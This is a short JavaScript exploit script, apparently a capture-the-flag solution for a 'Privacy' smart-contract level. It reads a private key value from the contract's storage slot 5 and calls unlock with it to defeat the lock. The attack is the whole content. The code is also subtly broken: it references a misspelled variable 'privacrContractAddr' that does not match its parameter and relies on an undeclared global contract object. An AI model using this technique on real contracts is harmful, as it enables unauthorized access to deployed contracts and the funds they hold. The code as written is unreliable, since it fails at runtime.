/**
 * @notice Define and run this function to hack
 * @param {string} privacyContractAddr Address of the Privacy contract
 */
async function hack(privacyContractAddr){
	// Get key to send
	const dataForKey = await web3.eth.getStorageAt(privacrContractAddr, 5);
	const key = `0x${dataForKey.slice(0, 34)}`;

	// Send key
	console.log(`USING KEY: ${key}`);
	await contract.unlock(key);
	
	// Get locked status
	const locked = await contract.locked();
	console.log(`LOCKED: ${locked}`);
}